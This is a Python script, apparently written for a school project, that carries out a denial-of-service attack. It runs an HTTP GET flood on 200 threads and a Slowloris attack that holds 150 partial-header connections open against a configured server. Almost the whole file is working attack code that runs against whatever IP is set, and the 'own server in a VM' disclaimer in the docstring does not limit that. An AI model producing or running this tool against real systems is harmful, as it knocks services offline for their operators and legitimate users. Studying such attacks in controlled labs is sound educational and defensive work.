"""
DDoS Demonstration - HTTP Flood + Slowloris
School Project - Use only against your own server in a controlled VM environment.

The target Java server uses setExecutor(null) which makes it single-threaded.
Slowloris works by opening connections and sending partial HTTP headers very
slowly, tying up the server's only thread so legitimate users can't connect.

Usage: python3 ddos.py
"""

import socket
import threading
import time
import sys
from config import SERVER_IP, TARGET_PORT

TARGET = SERVER_IP
PORT = TARGET_PORT
FLOOD_THREADS = 200       # HTTP flood threads
SLOWLORIS_SOCKETS = 150   # Persistent slow connections


# ---------- Attack 1: HTTP Flood ----------
# Blast rapid GET requests using raw sockets (way faster than requests library)

def http_flood():
    request = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((TARGET, PORT))
            s.sendall(request)
            s.close()
        except Exception:
            # Server is overwhelmed or unreachable - keep going
            pass


# ---------- Attack 2: Slowloris ----------
# Open connections and send partial headers slowly to hold them open.
# Since the server is single-threaded, even a few held connections block everyone.

def create_slowloris_socket():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((TARGET, PORT))
        # Send a partial HTTP request (no final \r\n\r\n so server keeps waiting)
        s.send(f"GET / HTTP/1.1\r\nHost: {TARGET}\r\n".encode())
        return s
    except Exception:
        return None


def slowloris():
    sockets = []

    # Build initial pool of slow connections
    print(f"[*] Opening {SLOWLORIS_SOCKETS} slowloris connections...")
    for _ in range(SLOWLORIS_SOCKETS):
        s = create_slowloris_socket()
        if s:
            sockets.append(s)
    print(f"[+] {len(sockets)} connections established")

    while True:
        # Send a partial header to keep connections alive
        for s in list(sockets):
            try:
                s.send("X-Keep-Alive: alive\r\n".encode())
            except Exception:
                sockets.remove(s)
                # Replace dead connections
                new_s = create_slowloris_socket()
                if new_s:
                    sockets.append(new_s)

        print(f"\r[*] Active slowloris connections: {len(sockets)}", end="", flush=True)
        time.sleep(10)


# ---------- Main ----------

if __name__ == "__main__":
    print("=" * 50)
    print("  DDoS Demo - HTTP Flood + Slowloris")
    print("=" * 50)
    print(f"  Target : {TARGET}:{PORT}")
    print(f"  Flood  : {FLOOD_THREADS} threads")
    print(f"  Slowlo : {SLOWLORIS_SOCKETS} connections")
    print("=" * 50)
    print()
    print("[*] Press Ctrl+C to stop")
    print()

    # Start slowloris in its own thread
    sl_thread = threading.Thread(target=slowloris, daemon=True)
    sl_thread.start()

    # Give slowloris a head start to tie up the server
    time.sleep(2)

    # Start HTTP flood threads
    print(f"[*] Launching {FLOOD_THREADS} flood threads...")
    for i in range(FLOOD_THREADS):
        t = threading.Thread(target=http_flood, daemon=True)
        t.start()
    print(f"[+] All flood threads running")
    print()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Stopped.")
        sys.exit(0)
